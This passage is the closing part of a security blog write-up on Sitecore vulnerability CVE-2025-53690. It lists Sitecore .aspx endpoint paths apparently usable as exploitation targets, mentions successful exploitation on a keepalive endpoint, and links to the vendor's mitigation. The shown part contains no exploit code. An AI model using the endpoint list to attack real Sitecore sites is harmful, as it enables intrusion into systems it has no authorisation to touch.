</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>noPublishable</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>notfound</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>service</span><span class=p>/</span><span class=n>xdb</span><span class=p>/</span><span class=n>disabled</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>ConfirmSubscription</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>ListUnsubscribe</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>RedirectUrlPage</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>Unsubscribe</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>UnsubscribeFromAll</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Single</span> <span class=n>Column</span> <span class=n>Layout</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Text</span> <span class=n>Message</span> <span class=n>Layout</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Two</span> <span class=n>Column</span> <span class=n>Layout</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Templates</span><span class=p>/</span><span class=n>Alternating</span> <span class=n>Columns</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Templates</span><span class=p>/</span><span class=n>Call</span> <span class=n>To</span> <span class=n>Action</span> <span class=n>Focus</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Templates</span><span class=p>/</span><span class=n>Image</span> <span class=n>Focus</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Templates</span><span class=p>/</span><span class=n>Main</span> <span class=n>Layout</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Templates</span><span class=p>/</span><span class=n>Thee</span> <span class=n>Column</span> <span class=n>Long</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>EXM</span><span class=p>/</span><span class=n>layouts</span><span class=p>/</span><span class=n>Templates</span><span class=p>/</span><span class=n>Two</span> <span class=n>Column</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>ExperienceExplorer</span><span class=p>/</span><span class=n>Controls</span><span class=p>/</span><span class=n>ExpEditor</span><span class=p>.</span><span class=n>aspx</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sitecore</span> <span class=n>modules</span><span class=p>/</span><span class=n>Web</span><span class=p>/</span><span class=n>ExperienceExplorer</span><span class=p>/</span><span class=n>Controls</span><span class=p>/</span><span class=n>ExpViewer</span><span class=p>.</span><span class=n>aspx</span>
</span></span></code></pre></td></tr></table></div></div><p>Successful exploitation on the keepalive endpoint:</p><p><img src=/p/cve-2025-53690/image43.png width=3155 height=1670 srcset="/p/cve-2025-53690/image43_hu_b071014e46dd80f7.png 480w, /p/cve-2025-53690/image43_hu_9f7b166457a2e7b1.png 1024w" loading=lazy class=gallery-image data-flex-grow=188 data-flex-basis=453px></p><h2 id=mitigation>Mitigation</h2><p>Please follow the mitigation steps on Sitecore bullettin here: <a class=link href="https://support.sitecore.com/kb?id=kb_article_view&amp;sysparm_article=KB1003865" target=_blank rel=noopener>https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1003865</a></p></section><footer class=article-footer><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>Last updated on Oct 30, 2025 00:00 UTC</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//eriklearningsec.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2023 -
2025 Erik Learning Sec</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>